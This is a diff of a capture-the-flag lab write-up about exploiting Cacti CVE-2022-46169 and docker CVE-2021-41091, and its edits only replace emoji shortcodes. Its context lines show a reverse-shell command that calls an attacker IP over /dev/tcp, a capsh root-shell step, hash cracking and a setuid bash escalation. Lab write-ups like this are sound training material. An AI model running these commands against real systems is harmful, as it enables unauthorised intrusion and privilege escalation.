@@ -125,14 +125,14 @@ I clearly misinterpreted what the author meant as "remote" IP and port. I'll do 
 > I'm trying to get out of the script-kiddie habit of always using 4444 for my initial reverse shell and 1337 for my root shell. Instead, I'll use some random port numbers. I'll also open up one for an HTTP server, which I often use for transferring files from my attacker machine to the target.
 > ![ufw](ufw.png)
 
-You know what? There is actually a LOT wrong with this exploit.  :flushed: I went through all the following, all to no avail:
+You know what? There is actually a LOT wrong with this exploit.  😳 I went through all the following, all to no avail:
 
 - Corrected the shebang
 - Added exception handling to the exploit, to keep running even when it inevitable encounters a `TimoutError`
 - Parameterized the GET request timeout
 - Re-wrote it to be multi-threaded, because even a timeout of 1s would have taken three hours to enumerate.
 
-:thinking: That looked like the right exploit. Oh well, the author did credit the CVE in the comments at the beginning of the script, so instead I'll just search for `CVE-2022-46169` online and see if anyone has written a different PoC script.
+🤔 That looked like the right exploit. Oh well, the author did credit the CVE in the comments at the beginning of the script, so instead I'll just search for `CVE-2022-46169` online and see if anyone has written a different PoC script.
 
 ### PoC by @sAsPeCt488
 
@@ -146,11 +146,11 @@ Turns out there are quite a few! [This github repo](https://github.com/sAsPeCt48
 python3 CVE-2022-46169.py -c "bash -c 'exec bash -i &>/dev/tcp/10.10.14.2/32476 <&1'" --n_host_ids 100 --n_local_data_ids 100 http://$RADDR
 ```
 
-And... voila! :tada: We have a reverse shell:
+And... voila! 🎉 We have a reverse shell:
 
 ![reverse shell](reverse%20shell.png)
 
-> :monkey: This got me wondering why the previous script didn't work. 
+> 🐒 This got me wondering why the previous script didn't work. 
 >
 > Doing a quick comparison of the code, it looks like `51166.py` mixed up the `X-Forwarded-For` header with the address of the Cacti server. I corrected this in my modification of `51166.py` and tried re-running it, but still no luck: no reverse shell. 
 >
@@ -175,7 +175,7 @@ stty raw -echo; fg
 export TERM=xterm-256color
 ```
 
-The shell will be backgrounded, then enable echo mode with ``stty``, then brought back to the foreground. This should make the shell much more comfortable to use. Enjoy your tab-completion and colours :rainbow:.
+The shell will be backgrounded, then enable echo mode with ``stty``, then brought back to the foreground. This should make the shell much more comfortable to use. Enjoy your tab-completion and colours 🌈.
 
 
 
@@ -376,7 +376,7 @@ Now that **jimbo** is assigned to the correct *realms*, I'll try logging in agai
 ![login successful](login%20successful.png)
 
 Bingo! We're in to the Cacti web interface, logged in as **jimbo**. 
-Taking a peek at some of the logs, it looks like I was a little noisy trying to log in :sweat_smile:
+Taking a peek at some of the logs, it looks like I was a little noisy trying to log in 😅
 
 ![login logs](login%20logs.png)
 
@@ -400,7 +400,7 @@ Excellent, let's try enumerating the available info:
 
 ![failed to enumate snmp](failed%20to%20enumate%20snmp.png)
 
-:thinking: Hmm... nothing. Maybe I'll revisit SNMP if I'm desperate. For now though, it looks empty. 
+🤔 Hmm... nothing. Maybe I'll revisit SNMP if I'm desperate. For now though, it looks empty. 
 
 
 
@@ -428,7 +428,7 @@ Perfect. I was pretty close, I just hadn't tried the right flags. I needed to pr
 www-data@50bca5e748b0:/tmp/Tools$ capsh --gid=0 --uid=0 -- 
 ```
 
-There we go! *Houston, we have a root shell* :tada:
+There we go! *Houston, we have a root shell* 🎉
 
 ![root shell gained](root%20shell%20gained.png)
 
@@ -436,7 +436,7 @@ Alright, we didn't find a user flag earlier. Perhaps only root had access to bot
 
 ![still no flags](still%20no%20flags.png)
 
-What?! Still no flags? This is rough :disappointed:
+What?! Still no flags? This is rough 😞
 
 Now that I'm a new user, I'll repeat my User Enumeration (Linux) strategy. These are the notable results:
 
@@ -450,7 +450,7 @@ The [relevant Hacktricks article](https://book.hacktricks.xyz/linux-hardening/pr
 
 ------
 
-:rotating_light: ALERT ALERT ALERT ***john just cracked a hash!!!***
+🚨 ALERT ALERT ALERT ***john just cracked a hash!!!***
 We now have a new credential. And, surprise surprise it is NOT a user from this box (a user from within this docker container!): 
 
 ![found password](found%20password.png)
@@ -499,13 +499,13 @@ Interesting. Let's look at each of those vulnerabilities:
 3. **CVE-2021-41091**
    Running `docker version` reveals that the box has docker `20.10.5+dfsg1`. It might be vulnerable. 
 
-OK. Before I dive too deep into that, let me see if we can *finally* get a user flag :pray:
+OK. Before I dive too deep into that, let me see if we can *finally* get a user flag 🙏
 
 ```bash
 cat /home/marcus/user.txt
 ```
 
-*Sweet success.* Flag obtained. :cherries: :cherries: :cherries:
+*Sweet success.* Flag obtained. 🍒 🍒 🍒
 
 
 
@@ -574,9 +574,9 @@ So, I changed into that directory and tried running `./bin/bash -p`:
 
 ![CVE-2021-41091 2](CVE-2021-41091%202.png)
 
-:tada: Nice! a root shell! The euid is now set to `root`.
+🎉 Nice! a root shell! The euid is now set to `root`.
 
-> I've never seen that kind of privilege escalation before, but it was quite easy! This is definitely going on my list of things to check for whenever I'm in a docker container :white_check_mark:
+> I've never seen that kind of privilege escalation before, but it was quite easy! This is definitely going on my list of things to check for whenever I'm in a docker container ✅
 
 Now just simply ``cat`` out the flag to finish the box.
 
@@ -740,7 +740,7 @@ if __name__ == "__main__":
     main()
 ```
 
-I hope that helps somebody! Regardless, it was good Python practice :snake:
+I hope that helps somebody! Regardless, it was good Python practice 🐍
 
 
 
